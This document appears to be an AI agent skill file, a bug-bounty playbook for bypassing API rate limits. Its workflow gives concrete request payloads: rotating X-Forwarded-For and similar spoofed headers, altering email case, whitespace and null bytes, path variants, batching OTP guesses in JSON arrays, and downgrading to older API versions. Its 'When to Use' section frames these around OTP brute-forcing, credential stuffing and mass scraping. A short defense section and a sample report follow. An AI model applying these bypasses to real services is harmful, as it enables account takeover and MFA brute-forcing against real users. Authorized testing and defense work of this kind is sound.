---
name: api-rate-limit-bypass-techniques
description: >
  Identify and exploit flaws in API rate limiting enforcement. Use this skill when 
  encountering HTTP 429 Too Many Requests errors during password brute-forcing, OTP 
  validation, credential stuffing, or enumeration attacks. These bypasses leverage IP spoofing, 
  parameter manipulation, and edge-case application logic.
domain: cybersecurity
subdomain: bug-hunting
category: API Security
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006, TA0040]
  techniques: [T1110.001, T1499.004]
platforms: [linux, windows]
tags: [rate-limiting, bypass, waf, brute-force, otp-bypass, api-security, bug-hunting]
tools: [burpsuite, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# API Rate Limit Bypass Techniques

## When to Use
- When attempting to brute-force a 4-digit or 6-digit SMS/Email OTP (One Time Password) but the server blocks access after 5 attempts.
- When credential stuffing a login portal protected strictly by IP-based rate limiting (e.g., 10 logins per IP address per minute).
- When scraping excessive amounts of data from a public API endpoint before hitting a quota wall.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Bypassing IP-Based Rate Limiting

```text
# Concept: A WAF (Web Application Firewall) generally limits based on the client's IP address.
# If we can spoof our IP address using trusted Proxy metadata headers, the WAF may log the 
# spoofed IP instead of our actual IP, allowing infinite resets of the counter.

# 1. Trigger the block (HTTP 429 Too Many Requests)
# 2. Add/Iterate these HTTP headers using a Burp Intruder Payload (e.g., random IP lists):

X-Forwarded-For: 12.12.12.12
X-Forwarded-Host: 12.12.12.12
X-Client-IP: 12.12.12.12
X-Remote-IP: 12.12.12.12
X-Remote-Addr: 12.12.12.12
X-Originating-IP: 12.12.12.12
True-Client-IP: 12.12.12.12

# 3. Execution: If the server responds with HTTP 200 OK after injecting a new IP, 
# you have successfully bypassed the IP-based limitation. Automate injecting a random IP per request.
```

### Phase 2: Bypassing Account-Based Limiters (Path/JSON Manipulation)

```json
# Concept: If the rate limiter functions by tracking the specific identifier (the email or username) 
# rather than the IP address, we must alter the identifier *just enough* that the WAF registers 
# a new cache key, but the backend database query still hits the same user.

# Attempt 1: Case Sensitivity (Often the WAF is case-sensitive, DB is case-insensitive)
POST /login
{"email": "admin@target.com"} # Blocked after 5 tries
{"email": "AdMiN@target.com"} # WAF sees new string and allows. Backend DB ignores case and tests password.

# Attempt 2: Whitespace and Null bytes
{"email": "admin@target.com "} # Appending a space (Trimmed by backend)
{"email": "admin@target.com%00"}

# Attempt 3: Path manipulation (If endpoint is /api/v1/login)
POST /api/v1/login
POST /api/v1/login/
POST /api/v1//login
POST /api/v1/login?random=123
POST /api/v1/.../login
```

### Phase 3: The Array Payload Bypass (JSON Batching)

```json
# Concept: Many APIs are written in frameworks (like Spring Boot, Express, or Rails) that 
# accept input JSON parameters as an Array, rather than a String.

# The Flaw: The Rate Limiter inspects the SINGLE HTTP request, counting it as "1 attempt".
# The Backend Iterates the Array and tests ALL variables in that single request.

# 1. Blocked standard request:
POST /validate-otp
{"otp": "1234"}

# 2. Array Payload (Testing 100 OTPs in 1 request):
POST /validate-otp
{"otp": ["1234", "1235", "1236", "1237", ..., "9999"]}

# If the server responds indicating a success, the backend iterated the array, bypassing the 5-attempt WAF limiter perfectly!
```

### Phase 4: API Versioning Downgrades

```text
# Concept: Developers heavily secure `/api/v3/login` with strict Cloudflare rate limiting.
# They often forget to apply those specific WAF rules to `/api/v1/login` or mobile endpoints.

# Action: Change the URI path.
POST /api/v1/login
# OR target mobile subdomains:
POST /api/mobile/login
Host: m.target.com
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Encounter HTTP 429 Status] --> B{What is the WAF tracking?}
    B -->|Client IP Address| C[Inject X-Forwarded-For headers]
    B -->|Target ID / Email| D[Inject spaces, case-switching, and path modifiers]
    D --> E{Did the bypass work?}
    C --> E
    E -->|No| F[Attempt Array Payload Batching `[user1, user2]`]
    E -->|Yes| G[Automate exploitation via Burp Intruder]
    F -->|Blocked entirely| H[Test deprecated /v1/ API endpoints]
```


## 🔵 Blue Team Detection & Defense
- **Defense-in-Depth Counting**: Rate limits must track BOTH the IP Address AND the specific requested entity (e.g., tracking the failed attempts strictly against the `user_id` record in a high-speed Redis cache before verifying the database).
- **Strict Header Validation**: Do not blindly trust `X-Forwarded-For` or `Client-IP` headers supplied by arbitrary internet traffic. Extract the true Client IP exclusively from the trusted Edge Load Balancer TCP socket metadata.
- **Strict Type Checking**: Validate incoming JSON payloads dynamically. If an endpoint expects an `otp` parameter as a String, strictly reject requests submitting array representations `[]` with an `HTTP 400 Bad Request`.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Rate Limiting | A strategy for limiting network traffic, restricting how often a client can repeat an action within a certain timeframe |
| OTP | One-Time Password; a numeric or alphanumeric code utilized to verify ownership of an asset. Due to their short length (4-6 digits), they are exceptionally vulnerable to brute-force if rate limiting fails |
| X-Forwarded-For | A de-facto standard header used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer |

## Output Format
```
Bug Bounty Report: WAF Rate Limit Evasion leading to Account Takeover
=====================================================================
Vulnerability: Rate Limit Bypass via Header Manipulation
Severity: High (CVSS 7.5)
Target: POST /api/v2/auth/mfa/verify

Description:
The Multi-Factor Authentication (MFA) endpoint is protected by a rate limiter that issues an `HTTP 429 Too Many Requests` response after 5 failed 6-digit OTP attempts. However, the limitation exclusively monitors the `X-Forwarded-For` HTTP header maliciously supplied by the client, failing to track the failures at the account level.

By utilizing Burp Intruder alongside a script that rotates the `X-Forwarded-For` header with a randomly generated IP address upon every request, an attacker can submit infinite brute-force requests. Since a 6-digit pin possesses only 1,000,000 combinations, an attacker can systematically brute-force the victim's MFA token within approximately 24 hours.

Reproduction Steps:
1. Initiate the login flow and reach the MFA validation step.
2. Intercept the MFA submission request.
3. Add the `X-Forwarded-For: 1.1.1.1` header.
4. Send the request to Burp Intruder. Configure payload 1 to iterate '100000' to '999999'. Configure payload 2 to iterate random IP addresses generating a new string per request.
5. Initiate the attack. Observe infinite `HTTP 401 Unauthorized` responses without triggering an `HTTP 429` block, until the valid token is submitted.

Impact:
Critical failure of the MFA perimeter allowing complete bypass via automated brute-forcing.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [API4:2023 Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0x11-i4-unrestricted-resource-consumption/)
- PayloadAllTheThings: [Race Condition & Rate Limiting Bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition)
- HackTricks: [Rate Limit Bypass Bounties](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass)
